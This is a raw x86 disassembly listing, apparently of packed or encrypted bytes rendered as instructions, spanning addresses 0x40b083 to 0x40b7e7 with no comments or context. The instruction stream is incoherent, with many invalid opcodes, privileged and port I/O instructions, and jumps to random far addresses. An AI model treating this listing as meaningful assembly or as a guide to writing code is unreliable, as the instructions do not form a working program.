  40b083:	adc    DWORD PTR [edi+ebx*1],ecx
  40b086:	ins    BYTE PTR es:[edi],dx
  40b087:	xchg   ebx,eax
  40b088:	mov    ds:0xa6987b1a,eax
  40b08d:	cmp    al,0x79
  40b08f:	repz cwde 
  40b091:	pop    ebp
  40b092:	add    BYTE PTR [edx],dl
  40b094:	jecxz  0x40b069
  40b096:	or     al,0x8b
  40b098:	fistp  DWORD PTR [edx]
  40b09a:	daa    
  40b09b:	or     DWORD PTR [ebp+0x71808657],eax
  40b0a1:	lods   al,BYTE PTR ds:[esi]
  40b0a2:	std    
  40b0a3:	push   cs
  40b0a4:	cld    
  40b0a5:	aas    
  40b0a6:	aad    0x9
  40b0a8:	push   eax
  40b0a9:	dec    esi
  40b0aa:	hlt    
  40b0ab:	nop
  40b0ac:	popa   
  40b0ad:	sub    DWORD PTR [ebx+eiz*4-0x63eab1f9],0x51
  40b0b5:	sub    DWORD PTR [ecx],0xe17de041
  40b0bb:	or     eax,0xabec1a95
  40b0c0:	stos   DWORD PTR es:[edi],eax
  40b0c1:	jne    0x40b0b9
  40b0c3:	aaa    
  40b0c4:	adc    BYTE PTR [eax+0x48177073],ch
  40b0ca:	repz push ebp
  40b0cc:	call   0xbc204784
  40b0d1:	dec    edx
  40b0d2:	jb     0x40b0d6
  40b0d4:	(bad)  
  40b0d5:	inc    BYTE PTR [ecx]
  40b0d7:	test   dl,dh
  40b0d9:	xor    ecx,DWORD PTR [ecx-0x1d]
  40b0dc:	test   DWORD PTR [eax-0x63],0x5c39b613
  40b0e3:	cmp    dh,dh
  40b0e5:	cwde   
  40b0e6:	dec    ebp
  40b0e7:	push   ds
  40b0e8:	fst    st(3)
  40b0ea:	mov    ebp,0xbf568231
  40b0ef:	repz jmp 0x40b151
  40b0f2:	jnp    0x40b15e
  40b0f4:	hlt    
  40b0f5:	xor    al,0x74
  40b0f7:	loope  0x40b0e0
  40b0f9:	add    BYTE PTR [edi+0x13],al
  40b0fc:	mov    DWORD PTR [ebx+0x4e],0xc1b13e91
  40b103:	pop    ebx
  40b104:	ret    0x185d
  40b107:	vmwrite eax,DWORD PTR [edx+ebp*4]
  40b10b:	ret    0xc067
  40b10e:	mov    edi,0xc77a258d
  40b113:	cwde   
  40b114:	mov    ah,0x74
  40b116:	shl    DWORD PTR [edx],0x9c
  40b119:	mov    ds:0xdd72c4aa,al
  40b11e:	imul   edi,DWORD PTR [ebp-0x24],0xffffff91
  40b122:	jnp    0x40b0f2
  40b124:	dec    BYTE PTR [edi+eax*2-0x17248c42]
  40b12b:	xor    DWORD PTR [edi],0xffffffda
  40b12e:	mov    eax,0x239bebec
  40b133:	mov    edx,DWORD PTR [ecx-0x9]
  40b136:	cmp    eax,0xef641875
  40b13b:	dec    edx
  40b13c:	cmp    cl,al
  40b13e:	arpl   WORD PTR [esi],di
  40b140:	arpl   dx,si
  40b142:	arpl   WORD PTR [esi],si
  40b144:	jbe    0x40b0ca
  40b146:	aaa    
  40b147:	bnd jae 0x40b1a0
  40b14a:	pusha  
  40b14b:	dec    edi
  40b14c:	xor    ecx,DWORD PTR ds:0x24fe3d7a
  40b152:	fisub  WORD PTR [ecx-0x2b78305]
  40b158:	mov    BYTE PTR [ecx],ah
  40b15a:	aaa    
  40b15b:	out    0xe5,eax
  40b15d:	cmp    al,0x15
  40b15f:	xchg   ebx,eax
  40b160:	push   ebp
  40b161:	xchg   edx,eax
  40b162:	ficomp DWORD PTR [ecx+0x1a603351]
  40b168:	pop    es
  40b169:	xchg   edx,eax
  40b16a:	dec    ecx
  40b16b:	(bad)  
  40b16c:	inc    ebx
  40b16d:	cmc    
  40b16e:	add    DWORD PTR [ebx+0x77],edx
  40b171:	dec    esi
  40b172:	(bad)  
  40b173:	in     al,dx
  40b174:	aaa    
  40b175:	in     eax,0x4e
  40b177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b178:	int3   
  40b179:	aam    0x84
  40b17b:	jnp    0x40b19a
  40b17d:	retf   0x43b2
  40b180:	lods   al,BYTE PTR ds:[esi]
  40b181:	xchg   edx,eax
  40b182:	inc    esp
  40b183:	pop    ds
  40b184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b185:	aas    
  40b186:	xchg   edi,eax
  40b187:	sbb    ecx,DWORD PTR [edx]
  40b189:	aad    0xe6
  40b18b:	popf   
  40b18c:	and    edx,ecx
  40b18e:	sub    al,0x4a
  40b190:	cs addr16 into 
  40b193:	lahf   
  40b194:	mov    ecx,DWORD PTR [edi+0xb01326e]
  40b19a:	pop    edx
  40b19b:	into   
  40b19c:	sar    BYTE PTR [ecx+ebp*4],0xa4
  40b1a0:	lea    edi,[ebx+esi*2]
  40b1a3:	js     0x40b167
  40b1a5:	push   edi
  40b1a6:	xor    eax,0x2a179ea5
  40b1ab:	loopne 0x40b1e2
  40b1ad:	mov    bh,0x39
  40b1af:	and    eax,0x713985a0
  40b1b4:	lds    eax,FWORD PTR [ecx+0x7de7fcfd]
  40b1ba:	aas    
  40b1bb:	mov    BYTE PTR [ebx-0x32515879],ch
  40b1c1:	mov    edx,0x6eabb104
  40b1c6:	retf   0x6049
  40b1c9:	pop    es
  40b1ca:	push   ebx
  40b1cb:	jl     0x40b232
  40b1cd:	lods   eax,DWORD PTR ds:[esi]
  40b1cf:	and    BYTE PTR [ecx+eax*1-0xeeee912],ch
  40b1d6:	xchg   esp,eax
  40b1d7:	inc    ebp
  40b1d8:	or     bl,dh
  40b1da:	mov    ah,0xde
  40b1dc:	push   edx
  40b1dd:	call   0x86a7:0x1b7cd76
  40b1e4:	das    
  40b1e5:	aas    
  40b1e6:	sub    BYTE PTR [eax],0xd8
  40b1e9:	mov    ah,0x61
  40b1eb:	adc    eax,0x4c271f78
  40b1f0:	mov    fs,WORD PTR [esi+0x2b]
  40b1f3:	mov    DWORD PTR [eax+0x6205f221],eax
  40b1f9:	(bad)  
  40b1fa:	scas   eax,DWORD PTR es:[edi]
  40b1fb:	das    
  40b1fc:	jnp    0x40b23a
  40b1fe:	data16 and BYTE PTR [esi],dh
  40b201:	add    al,BYTE PTR [ecx]
  40b203:	sbb    cl,BYTE PTR [edx]
  40b205:	sbb    DWORD PTR [ecx-0x6e],0x13
  40b209:	icebp  
  40b20a:	pop    DWORD PTR [ebx]
  40b20c:	daa    
  40b20d:	loopne 0x40b1b2
  40b20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b210:	sbb    al,0xd7
  40b212:	out    0x20,al
  40b214:	xchg   esi,eax
  40b215:	add    eax,0x194466b4
  40b21a:	sbb    al,0x41
  40b21c:	bound  edi,QWORD PTR [edi-0x4a4ab0a8]
  40b222:	stc    
  40b223:	mov    bl,0x4b
  40b225:	sub    eax,0x50c8bad
  40b22a:	dec    ebp
  40b22b:	mov    es,esi
  40b22d:	imul   edx,DWORD PTR [ebp-0x501f6e50],0x52
  40b234:	fst    DWORD PTR [edx]
  40b236:	cmp    edi,edx
  40b238:	mov    ebx,0xf59a95ae
  40b23d:	fst    DWORD PTR [ecx]
  40b23f:	retf   
  40b240:	push   0x2d
  40b242:	call   0x6ed0:0x83385e55
  40b249:	test   al,0x72
  40b24b:	mov    al,0x8d
  40b24d:	scas   eax,DWORD PTR es:[edi]
  40b24e:	sbb    esi,eax
  40b250:	inc    ebp
  40b251:	iret   
  40b252:	arpl   WORD PTR [ecx],cx
  40b254:	ffreep st(1)
  40b256:	pop    es
  40b257:	repz fst DWORD PTR [edi]
  40b25a:	out    0xa2,eax
  40b25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b25d:	(bad)  
  40b260:	or     ecx,DWORD PTR [esi]
  40b262:	mov    esp,0x4117ef47
  40b267:	ret    
  40b268:	ror    DWORD PTR [ebx+ebx*4],cl
  40b26b:	(bad)  
  40b26d:	hlt    
  40b26e:	adc    al,0xcb
  40b270:	sub    eax,0xd1a68b58
  40b275:	cmp    BYTE PTR [ecx+ebp*2+0xff2942],0x4d
  40b27d:	and    ebp,ecx
  40b27f:	mov    bl,0x12
  40b281:	daa    
  40b282:	xor    BYTE PTR [ebx],bl
  40b284:	retf   0x2763
  40b287:	mov    bh,BYTE PTR [ebp+0x5fa5f071]
  40b28d:	mov    BYTE PTR [esi],bh
  40b28f:	push   ecx
  40b290:	bound  edi,QWORD PTR [ebx]
  40b292:	xchg   BYTE PTR [edi-0x5f91a0fa],al
  40b298:	mov    al,ds:0xe74e7f5c
  40b29d:	pop    ss
  40b29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b29f:	push   ebp
  40b2a0:	jmp    0x2773e769
  40b2a5:	push   0x6f
  40b2a7:	mov    ch,0x9f
  40b2a9:	jg     0x40b2d8
  40b2ab:	sbb    DWORD PTR [edi-0x7c],ebp
  40b2ae:	adc    bh,BYTE PTR [esi+0x1c5ecf71]
  40b2b4:	xchg   edx,eax
  40b2b5:	arpl   WORD PTR [ecx-0x14599d0a],ax
  40b2bb:	scas   al,BYTE PTR es:[edi]
  40b2bc:	adc    bh,BYTE PTR [ebx-0x6d]
  40b2bf:	imul   esp,DWORD PTR [ebx],0xa330a4ab
  40b2c5:	xor    BYTE PTR [edx],0x1b
  40b2c8:	inc    eax
  40b2c9:	xchg   ebp,eax
  40b2ca:	push   0x5f
  40b2cc:	mov    bh,0x79
  40b2ce:	inc    esi
  40b2cf:	(bad)  
  40b2d0:	push   0x22f850eb
  40b2d5:	push   cs
  40b2d6:	jl     0x40b349
  40b2d8:	mov    bl,0x61
  40b2da:	jnp    0x40b2e2
  40b2dc:	lds    ecx,FWORD PTR [ebp-0x142c205c]
  40b2e2:	jb     0x40b265
  40b2e4:	sub    eax,0xcef9e25
  40b2e9:	sbb    al,0x1a
  40b2eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2ec:	sub    eax,0x6adad8f
  40b2f1:	xor    BYTE PTR [ecx+ebp*4-0x601c944c],bl
  40b2f8:	dec    ecx
  40b2f9:	inc    ecx
  40b2fa:	out    0xf4,eax
  40b2fc:	pop    eax
  40b2fd:	pop    edx
  40b2fe:	cmp    ebp,DWORD PTR [edx-0x89c9e6c]
  40b304:	(bad)  
  40b305:	jg     0x40b30f
  40b307:	pop    ds
  40b308:	dec    eax
  40b309:	push   ss
  40b30a:	nop
  40b30b:	hlt    
  40b30c:	push   ebp
  40b30d:	(bad)  
  40b30e:	pop    esp
  40b30f:	loop   0x40b37f
  40b311:	push   ds
  40b312:	add    DWORD PTR [edx-0x14],esi
  40b315:	mov    ds:0x28934af5,al
  40b31a:	(bad)  
  40b31b:	psubusw mm5,QWORD PTR [ecx]
  40b31e:	cli    
  40b31f:	inc    esi
  40b320:	mov    WORD PTR [ebx+0x226c9d31],ss
  40b326:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b328:	scas   eax,DWORD PTR es:[edi]
  40b329:	dec    eax
  40b32a:	mov    ch,0x6c
  40b32c:	push   esp
  40b32d:	mov    bh,0x9c
  40b32f:	shl    ebp,0x29
  40b332:	cmp    eax,0x32dfaa2f
  40b337:	leave  
  40b338:	xchg   ebx,eax
  40b339:	add    al,BYTE PTR [eax+eiz*1]
  40b33c:	adc    al,0x55
  40b33e:	fwait
  40b33f:	icebp  
  40b340:	push   es
  40b341:	(bad)  
  40b343:	jg     0x40b339
  40b345:	mov    al,0x3d
  40b347:	rcr    BYTE PTR [esp+ebp*2+0x43474c9a],1
  40b34e:	push   ds
  40b34f:	sbb    al,0x1e
  40b351:	outs   dx,BYTE PTR cs:[esi]
  40b353:	jmp    0xa41fd810
  40b358:	hlt    
  40b359:	js     0x40b3b2
  40b35b:	aad    0x49
  40b35d:	sbb    dh,BYTE PTR [eax]
  40b35f:	mul    edi
  40b361:	push   esi
  40b362:	sbb    bh,BYTE PTR [eax-0x4a]
  40b365:	inc    ecx
  40b366:	xlat   BYTE PTR ds:[ebx]
  40b367:	jns    0x40b397
  40b369:	mov    bh,0xfa
  40b36b:	mov    bh,0xc9
  40b36d:	pop    edi
  40b36e:	mov    eax,0xc0b89723
  40b373:	sbb    ecx,DWORD PTR [edi+0x49b10c2b]
  40b379:	fcom   st(5)
  40b37b:	jmp    0x5683d2ed
  40b380:	dec    eax
  40b381:	mul    DWORD PTR [ecx-0x77067b92]
  40b387:	(bad)  
  40b388:	out    dx,eax
  40b389:	and    al,0x1f
  40b38b:	push   0x7b66fdcd
  40b390:	mov    bl,0x79
  40b392:	into   
  40b393:	ins    DWORD PTR es:[edi],dx
  40b394:	ret    
  40b395:	popf   
  40b396:	jg     0x40b39a
  40b398:	xor    esi,DWORD PTR [ecx+0x57063933]
  40b39e:	cmp    DWORD PTR [ebx-0x7f745532],edx
  40b3a4:	aas    
  40b3a5:	xchg   DWORD PTR [ebx-0x2b],esp
  40b3a8:	cwde   
  40b3a9:	sbb    eax,0xa6c399d5
  40b3ae:	leave  
  40b3af:	pop    ecx
  40b3b0:	call   0xf190:0xd5d50e5
  40b3b7:	sub    al,0x2c
  40b3ba:	mov    dl,0xe1
  40b3bc:	pop    ds
  40b3bd:	sub    eax,0xa2342893
  40b3c2:	test   DWORD PTR [edx+0x33],edi
  40b3c5:	and    BYTE PTR [eax+0x2],ah
  40b3c8:	sti    
  40b3c9:	das    
  40b3ca:	daa    
  40b3cb:	imul   edi,edi,0x7a5ac78f
  40b3d1:	mov    ss,WORD PTR [edi+0x4a]
  40b3d4:	leave  
  40b3d5:	adc    DWORD PTR [eax],eax
  40b3d7:	xor    bl,BYTE PTR [ebp+edx*4-0x4746f62f]
  40b3de:	lahf   
  40b3df:	xchg   ebx,eax
  40b3e0:	lds    esi,FWORD PTR [ebp+0x45]
  40b3e3:	test   al,0xfb
  40b3e5:	ss dec esp
  40b3e7:	(bad)  [ebp-0x69]
  40b3ea:	push   esi
  40b3eb:	shl    bh,1
  40b3ed:	cld    
  40b3ee:	rcr    DWORD PTR [edi-0x1d2e4baf],cl
  40b3f4:	in     eax,dx
  40b3f5:	mov    ebp,0x5c170b0f
  40b3fa:	mul    ah
  40b3fc:	in     eax,0x4b
  40b3fe:	and    bh,0x23
  40b401:	sar    DWORD PTR [ebx+0x7fbd9189],0xd0
  40b408:	int    0x4c
  40b40a:	inc    esi
  40b40b:	and    DWORD PTR [esi+0x7d],ebx
  40b40e:	sti    
  40b40f:	mov    ebx,0x2c6edb1b
  40b414:	lods   al,BYTE PTR ds:[esi]
  40b415:	xchg   esi,eax
  40b416:	pushf  
  40b417:	(bad)  
  40b418:	add    BYTE PTR [ecx+0x3f5b3c3d],0x16
  40b41f:	sub    edi,DWORD PTR [edi-0xc]
  40b422:	fdivr  QWORD PTR [edx-0x6b]
  40b425:	int    0x5
  40b427:	sub    DWORD PTR [eax],ebp
  40b429:	inc    esp
  40b42a:	aaa    
  40b42b:	jno    0x40b40f
  40b42d:	addr16 add al,0xb2
  40b430:	and    eax,0x204a064a
  40b435:	outs   dx,DWORD PTR ds:[esi]
  40b436:	retf   0xeb7e
  40b439:	scas   al,BYTE PTR es:[edi]
  40b43a:	xchg   ebp,eax
  40b43b:	sbb    esi,DWORD PTR [esi-0x76]
  40b43e:	jnp    0x40b3de
  40b440:	cdq    
  40b441:	clc    
  40b442:	jecxz  0x40b429
  40b444:	shl    DWORD PTR [edi+ebp*4+0x46],0xcd
  40b449:	xor    ch,al
  40b44b:	cmp    DWORD PTR [ecx],esp
  40b44d:	cmp    eax,DWORD PTR [esi]
  40b44f:	sbb    BYTE PTR [edx-0x19],dh
  40b452:	cld    
  40b453:	mov    esi,0x9e0a9b8f
  40b458:	xor    al,ch
  40b45a:	push   0x6153d605
  40b45f:	mov    ds:0xa22471f9,eax
  40b464:	push   cs
  40b465:	dec    edx
  40b466:	push   ebx
  40b467:	sub    DWORD PTR [edx],eax
  40b469:	mov    bl,0xda
  40b46b:	jg     0x40b4d4
  40b46d:	sbb    al,0xc2
  40b46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b470:	inc    edx
  40b471:	ins    BYTE PTR es:[edi],dx
  40b472:	lea    esi,[ebx+0x6a1b674a]
  40b478:	call   0xb6cdd895
  40b47d:	add    ebp,ecx
  40b47f:	repnz in eax,dx
  40b481:	xor    BYTE PTR [edi+0x48b4f84c],cl
  40b487:	sbb    BYTE PTR [edx],bl
  40b489:	sbb    bl,dh
  40b48b:	jle    0x40b48d
  40b48d:	push   0xffffffcb
  40b48f:	jmp    0x6694:0x73024a94
  40b496:	inc    edx
  40b497:	jecxz  0x40b4bd
  40b499:	jmp    0x40b487
  40b49b:	das    
  40b49c:	repz or BYTE PTR ds:0xbeb5a9af,bl
  40b4a3:	add    ecx,DWORD PTR [ecx]
  40b4a5:	pushf  
  40b4a6:	jle    0x40b460
  40b4a8:	mov    dl,0xbb
  40b4aa:	mov    cl,0xdb
  40b4ac:	push   esi
  40b4ad:	loope  0x40b49d
  40b4af:	adc    BYTE PTR [edx+0x69aaa2fb],al
  40b4b5:	cmp    edx,edx
  40b4b7:	sbb    eax,0xf
  40b4ba:	js     0x40b4af
  40b4bc:	(bad)  
  40b4bd:	loope  0x40b52a
  40b4bf:	test   BYTE PTR [ebp+0x13073c93],dl
  40b4c5:	pusha  
  40b4c6:	int    0x6b
  40b4c8:	adc    eax,0x60c5644c
  40b4cd:	and    eax,0x98468715
  40b4d2:	push   0xffffffb7
  40b4d4:	je     0x40b45b
  40b4d6:	loop   0x40b4ad
  40b4d8:	fs aam 0xa6
  40b4db:	cmp    eax,0x56602538
  40b4e0:	jge    0x40b51d
  40b4e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e3:	xlat   BYTE PTR ds:[ebx]
  40b4e4:	pop    ecx
  40b4e5:	leave  
  40b4e6:	pop    eax
  40b4e7:	xlat   BYTE PTR ds:[ebx]
  40b4e8:	cmp    eax,0x724c2b06
  40b4ed:	into   
  40b4ee:	(bad)  
  40b4ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f0:	loopne 0x40b4f5
  40b4f2:	mov    ebx,0xdbed6d4f
  40b4f7:	dec    esi
  40b4f8:	or     BYTE PTR [edx+0x15a07fc6],bh
  40b4fe:	and    eax,0xceec261f
  40b503:	pop    eax
  40b504:	push   eax
  40b505:	fsubr  QWORD PTR [ecx-0x118257b6]
  40b50b:	repz mov bh,0x5b
  40b50e:	adc    esp,ebx
  40b510:	fistp  DWORD PTR [edx-0x5]
  40b513:	jno    0x40b497
  40b515:	dec    esi
  40b516:	pop    ebx
  40b517:	pop    esp
  40b519:	sbb    eax,0xf34cab9f
  40b51e:	aaa    
  40b51f:	sub    BYTE PTR [ebp-0x7d],0xb2
  40b523:	scas   al,BYTE PTR es:[edi]
  40b524:	xchg   edx,eax
  40b525:	stos   DWORD PTR es:[edi],eax
  40b526:	sub    cl,BYTE PTR [eax+0x7b05a9a6]
  40b52c:	sub    al,0x9d
  40b52e:	mov    ebp,0xe9df95e0
  40b533:	jno    0x40b4f5
  40b535:	mov    bl,BYTE PTR [ebx+0x7a57783e]
  40b53b:	and    al,0x89
  40b53d:	push   eax
  40b53e:	ins    DWORD PTR es:[edi],dx
  40b53f:	and    eax,0x7b36d918
  40b544:	xchg   ebp,eax
  40b545:	mov    ebp,0xe3d10c55
  40b54a:	push   DWORD PTR [edx]
  40b54c:	add    eax,DWORD PTR [edx+0xf9edc91]
  40b552:	(bad)  
  40b553:	dec    ebp
  40b554:	adc    dl,BYTE PTR [eax+esi*4+0x5e1cba1b]
  40b55b:	sbb    esp,DWORD PTR [esi-0x6dcee9ec]
  40b561:	rcl    BYTE PTR [ecx+0x6359dce8],0x33
  40b568:	aas    
  40b569:	aam    0x0
  40b56b:	pop    ebx
  40b56c:	mov    al,0x24
  40b56e:	xchg   edi,eax
  40b56f:	lods   al,BYTE PTR ds:[esi]
  40b570:	pop    es
  40b571:	mov    ah,0x7
  40b573:	outs   dx,BYTE PTR ds:[esi]
  40b574:	or     cl,0xc8
  40b577:	lods   eax,DWORD PTR ds:[esi]
  40b578:	pop    esi
  40b579:	push   ds
  40b57a:	xor    cl,BYTE PTR [edi]
  40b57c:	mov    ch,0x3a
  40b57e:	fwait
  40b57f:	stc    
  40b580:	jge    0x40b548
  40b582:	adc    esi,eax
  40b584:	mov    bh,0x6c
  40b586:	test   eax,0x5005d966
  40b58b:	addr16 mov edi,0x40592875
  40b591:	mov    bh,0x9d
  40b593:	jo     0x40b536
  40b595:	push   esi
  40b596:	pop    edi
  40b597:	stc    
  40b598:	add    dl,0xa4
  40b59b:	inc    ecx
  40b59c:	or     esp,DWORD PTR [eax-0x52]
  40b59f:	lea    eax,[esi+eiz*8]
  40b5a2:	adc    BYTE PTR [edi-0x48],0xd2
  40b5a6:	push   cs
  40b5a7:	call   0x8937a1fa
  40b5ac:	sbb    edi,esi
  40b5ae:	cmp    DWORD PTR [ebp-0x2e3b6f72],edx
  40b5b4:	xchg   ebx,eax
  40b5b5:	cmc    
  40b5b6:	std    
  40b5b7:	mov    bl,0xd
  40b5b9:	mov    ds:0xfbb673a,eax
  40b5be:	push   cs
  40b5bf:	mov    bl,0x5
  40b5c1:	inc    DWORD PTR [ebp-0x5b]
  40b5c4:	sti    
  40b5c5:	push   cs
  40b5c6:	xlat   BYTE PTR ds:[ebx]
  40b5c7:	sbb    ebp,DWORD PTR [ebp-0x303c568d]
  40b5cd:	xchg   ebp,eax
  40b5ce:	lods   al,BYTE PTR ds:[esi]
  40b5cf:	fmul   DWORD PTR [ebx]
  40b5d1:	fmul   DWORD PTR [ebp+0x41]
  40b5d4:	or     al,0x68
  40b5d6:	aaa    
  40b5d7:	imul   ecx,DWORD PTR [ecx-0x7607ad0a],0x7c7b033b
  40b5e1:	jle    0x40b568
  40b5e3:	fistp  WORD PTR [edx+0x7e]
  40b5e6:	in     al,dx
  40b5e7:	ss add ebx,eax
  40b5ea:	lods   al,BYTE PTR ds:[esi]
  40b5eb:	rcr    BYTE PTR ds:0x654ab24e,0x0
  40b5f2:	hlt    
  40b5f3:	push   ebp
  40b5f4:	rcl    DWORD PTR [eax-0xc],cl
  40b5f7:	push   es
  40b5f8:	mov    edx,0xa591d197
  40b5fd:	push   es
  40b5fe:	(bad)  
  40b5ff:	ror    DWORD PTR [edi+ecx*1],1
  40b602:	sub    al,0xe7
  40b604:	cli    
  40b605:	mov    ds:0x1db40b6a,al
  40b60a:	das    
  40b60b:	imul   ebx,DWORD PTR [edi],0x85fa8dc1
  40b611:	(bad)  
  40b612:	push   0xffffffb8
  40b614:	xor    DWORD PTR [ecx],edi
  40b616:	add    eax,0xf170b30
  40b61b:	int    0xc
  40b61d:	int    0xd7
  40b61f:	xor    esp,DWORD PTR [ebp+0x45]
  40b622:	sti    
  40b623:	push   esi
  40b624:	daa    
  40b625:	pop    esp
  40b626:	sar    bh,0x33
  40b629:	cmp    bh,BYTE PTR [ecx-0x80]
  40b62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62d:	lock xchg ebx,eax
  40b62f:	dec    edx
  40b630:	xchg   esi,eax
  40b631:	sti    
  40b632:	sub    eax,0xfa81f37a
  40b637:	(bad)  
  40b638:	into   
  40b639:	mov    cl,0x10
  40b63b:	aad    0x31
  40b63d:	aad    0xc7
  40b63f:	cwde   
  40b640:	mov    al,ds:0xc4912795
  40b645:	mov    ds:0xf2517516,al
  40b64a:	imul   esi,DWORD PTR [edi+0x37],0x252edfd6
  40b651:	pop    edi
  40b652:	xor    eax,0xffffffae
  40b655:	cmp    eax,0xe44861b2
  40b65a:	mov    ecx,0xd66e1841
  40b65f:	(bad)  
  40b660:	repnz call FWORD PTR [eax-0x4a01c01a]
  40b667:	mov    al,0x6c
  40b669:	dec    cl
  40b66b:	popf   
  40b66c:	mov    esi,0xf8119871
  40b671:	push   es
  40b672:	hlt    
  40b673:	jno    0x40b6dd
  40b675:	mov    dl,dh
  40b677:	cmp    ebp,DWORD PTR [ebx+0x499924a]
  40b67d:	rcl    BYTE PTR [eax-0x1adf6b2b],cl
  40b683:	jb     0x40b619
  40b685:	inc    esi
  40b686:	out    0x46,eax
  40b688:	lds    esi,FWORD PTR [ebx-0x58208915]
  40b68e:	rcl    BYTE PTR [edi+0x23],cl
  40b691:	jg     0x40b6fa
  40b693:	xchg   DWORD PTR [eax-0x75],ebx
  40b696:	sbb    edi,ebp
  40b698:	inc    eax
  40b699:	push   esi
  40b69a:	or     DWORD PTR [eax+0x15c4a573],ebx
  40b6a0:	punpckldq mm6,DWORD PTR [ebx+edi*2+0x1c]
  40b6a5:	je     0x69e2a4ba
  40b6ab:	xchg   edx,eax
  40b6ac:	lock ins BYTE PTR es:[edi],dx
  40b6ae:	cmp    DWORD PTR [esi-0x434549d5],ecx
  40b6b4:	push   bx
  40b6b6:	xor    eax,0x4075512c
  40b6bb:	dec    bx
  40b6bd:	cmc    
  40b6be:	lahf   
  40b6bf:	mov    ds:0x359e89e9,eax
  40b6c4:	shl    BYTE PTR [ebx],0x99
  40b6c7:	lods   al,BYTE PTR ds:[esi]
  40b6c8:	loopne 0x40b662
  40b6ca:	(bad)  
  40b6cb:	retf   
  40b6cc:	(bad)
  40b6d0:	xlat   BYTE PTR ds:[ebx]
  40b6d1:	fucomp st(5)
  40b6d3:	push   0x9c373aba
  40b6d8:	js     0x40b710
  40b6da:	cmp    DWORD PTR [ecx-0x57cab606],eax
  40b6e0:	mov    edx,0x553f2a7f
  40b6e5:	aaa    
  40b6e6:	das    
  40b6e7:	nop
  40b6e8:	div    DWORD PTR [edi+0x6bb0c647]
  40b6ee:	push   esp
  40b6ef:	inc    edi
  40b6f0:	sar    DWORD PTR [ebp-0x6fe7afe3],1
  40b6f6:	inc    ebp
  40b6f7:	mov    cl,0xb8
  40b6f9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40b6fb:	add    al,0xa0
  40b6fd:	(bad)  
  40b6ff:	xchg   ebx,eax
  40b700:	mov    ecx,0x6e7829b9
  40b705:	xchg   ebp,eax
  40b706:	inc    BYTE PTR [eax+0x351ed0c8]
  40b70c:	std    
  40b70d:	mov    ds,WORD PTR [ecx]
  40b70f:	ins    BYTE PTR es:[edi],dx
  40b710:	jnp    0x40b6e6
  40b712:	or     DWORD PTR [esi+0x6c6e3924],esi
  40b718:	or     ebx,DWORD PTR [ebp+0x1176736d]
  40b71e:	and    ah,BYTE PTR [ebp-0x2776ecba]
  40b724:	into   
  40b725:	sub    al,0xbf
  40b727:	out    0x13,al
  40b729:	mov    eax,ds:0xedc048fc
  40b72e:	push   ecx
  40b72f:	das    
  40b730:	jg     0x40b75d
  40b732:	stos   BYTE PTR es:[edi],al
  40b733:	imul   edx,DWORD PTR [ebx-0xa],0xffffffed
  40b737:	hlt    
  40b738:	mov    ch,0xf2
  40b73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b73b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b73c:	cli    
  40b73d:	loope  0x40b79c
  40b73f:	inc    edi
  40b740:	dec    ebx
  40b741:	inc    ebp
  40b742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b743:	add    ecx,DWORD PTR [ebp+0x63a4156f]
  40b749:	or     DWORD PTR [eax],ecx
  40b74b:	dec    esi
  40b74c:	pop    ecx
  40b74d:	(bad)  
  40b74f:	xor    esi,DWORD PTR [eax-0x32d6681c]
  40b755:	mov    bh,0xd3
  40b757:	sub    ebp,esi
  40b759:	add    cl,BYTE PTR [ecx]
  40b75b:	rcl    BYTE PTR [esi-0x40],0xa9
  40b75f:	aad    0x51
  40b761:	ss and esp,0x7e
  40b765:	pop    ss
  40b766:	daa    
  40b767:	inc    ebx
  40b768:	xchg   esp,eax
  40b769:	push   ds
  40b76a:	pop    ebp
  40b76b:	mov    eax,ds:0xb1a77c11
  40b770:	fild   DWORD PTR ds:0x64fae5f4
  40b776:	into   
  40b777:	add    DWORD PTR [eax+eiz*8+0x6dc5bda6],ecx
  40b77e:	and    edi,DWORD PTR [edx+eiz*8]
  40b781:	mov    bl,0x91
  40b783:	jl     0x40b797
  40b785:	add    BYTE PTR [edx+0x4fdee01],ch
  40b78b:	je     0x40b72a
  40b78d:	rcr    DWORD PTR [ebp+0x64],cl
  40b790:	inc    al
  40b792:	pop    edi
  40b793:	les    ebp,FWORD PTR [esi-0x4c]
  40b796:	out    dx,al
  40b797:	call   0x5a92:0x7934e786
  40b79e:	xchg   BYTE PTR [ebp-0x13],dl
  40b7a1:	mov    cl,0xc7
  40b7a3:	arpl   WORD PTR [edx-0x5743ded],ax
  40b7a9:	repnz ds lods eax,DWORD PTR es:[esi]
  40b7ad:	ret    0x37cf
  40b7b0:	mov    edi,0xfd7f3cd1
  40b7b5:	jge    0x40b79c
  40b7b7:	mov    edi,0xb989fc01
  40b7bc:	jle    0x40b771
  40b7be:	push   eax
  40b7bf:	loopne 0x40b7ee
  40b7c1:	mov    ah,0xa8
  40b7c3:	rcl    DWORD PTR [edi],0xe1
  40b7c6:	(bad)  
  40b7c7:	lea    ecx,[esi]
  40b7c9:	shr    DWORD PTR [ecx-0x55],cl
  40b7cc:	shl    DWORD PTR [ecx-0x639f0263],cl
  40b7d2:	std    
  40b7d3:	out    0xf5,al
  40b7d5:	popa   
  40b7d6:	cld    
  40b7d7:	ficomp DWORD PTR [esi-0x2]
  40b7da:	ja     0x40b84f
  40b7dc:	outs   dx,DWORD PTR ds:[esi]
  40b7dd:	and    edx,0xac6bc270
  40b7e3:	jno    0x40b7fc
  40b7e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7e6:	scas   eax,DWORD PTR es:[edi]
  40b7e7:	and    ebx,DWORD PTR [ebp-0x24a81f44]
